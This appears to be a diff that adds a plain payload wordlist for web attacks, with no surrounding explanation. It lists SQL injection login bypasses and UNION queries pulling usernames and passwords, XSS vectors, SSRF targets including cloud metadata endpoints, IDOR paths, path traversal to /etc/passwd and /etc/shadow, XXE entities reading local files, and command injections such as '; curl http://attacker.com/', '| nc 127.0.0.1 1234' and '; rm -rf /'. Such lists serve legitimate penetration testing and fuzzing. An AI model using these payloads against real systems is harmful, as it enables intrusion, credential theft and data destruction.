@@ -1,0 +1,145 @@
+' OR 1=1 --
+' OR '1'='1
+admin' --
+admin' #
+' OR '1'='1' --
+" OR 1=1 --
+" OR "1"="1
+' OR 'x'='x
+" OR "x"="x
+') OR ('x'='x
+') OR 1=1--
+" OR ""="
+') OR (1=1)
+') UNION SELECT NULL, NULL --
+') UNION SELECT username, password FROM users --
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+' AND 1=1
+' AND 1=2
+' AND 1=0 UNION SELECT 1, 'user', 'password'
+admin' OR '1'='1' -- 
+admin") OR ("1"="1
+admin' or 'x'='x
+') UNION SELECT 1, database(), version() --
+") UNION SELECT table_name, column_name FROM information_schema.tables --
+<script>alert(1)</script>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+"><iframe src=javascript:alert(1)>
+<marquee onstart=alert(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg onload=alert`1`>
+<details ontoggle=alert(1)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+javascript:alert(1)
+"><img src=x onerror=alert(1)//
+<video><source onerror=alert(1)>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+"><body onload=alert(1)>
+"><input autofocus onfocus=alert(1)>
+"><button onfocus=alert(1)>Click</button>
+"><audio src onerror=alert(1)>
+"><svg onload=alert(String.fromCharCode(88,83,83))>
+"><img src="x" onerror="alert(1)">
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/computeMetadata/v1/
+http://localhost/admin
+http://127.0.0.1:80
+http://[::1]
+http://internal-service
+file:///etc/passwd
+http://localhost:8000/
+https://169.254.169.254/latest/meta-data/
+http://0.0.0.0:80/
+http://127.0.0.1:8080/
+http://127.0.0.1/admin
+http://localhost
+http://localhost:3000
+http://example.com@169.254.169.254/latest/meta-data/
+http://localhost@169.254.169.254/latest/meta-data/
+/user/1
+/user/2
+/user?id=1
+/user?id=2
+/order/1
+/order/2
+/admin
+/account?id=1
+/account?id=2
+/profile?user=admin
+/profile?user=guest
+/cart/1
+/cart?id=2
+/cart?id=3
+/report?user_id=2
+/report?id=3
+/user?id=admin
+../../../../etc/passwd
+../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../../../../../etc/shadow
+../../../../../../../../etc/issue
+../../../boot.ini
+../../../../../../etc/hosts
+../../../../../../proc/self/environ
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+..%252f..%252f..%252fetc%252fpasswd
+../../../../../../../../../etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+../../../../../etc/passwd
+; cat /etc/passwd
+| ls
+`whoami`
+$(whoami)
+; curl http://attacker.com/
+| nc 127.0.0.1 1234
+& nslookup example.com
+`ping -c 5 127.0.0.1`
+| touch /tmp/exploit
+; rm -rf /
+|| whoami
+& dir
+| curl -X POST http://attacker.com
+| echo vulnerable
+; uname -a
+; ps aux
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://example.com">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE data [
+<!ENTITY xxe SYSTEM "file:///etc/issue">
+]>
+<data>&xxe;</data>
+
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>
+<test>&xxe;</test>
+
+<!DOCTYPE data [
+<!ENTITY xxe SYSTEM "file:///etc/shadow">
+]>
+<data>&xxe;</data>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
+<foo>&xxe;</foo>
+' OR '1'='1
+" OR "1"="1
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1' --
+admin' or '1'='1' /* 
+' or '1'='1'--
+'||'='
+'='
+"="
+'|| 1=1
+" OR "x"="x"
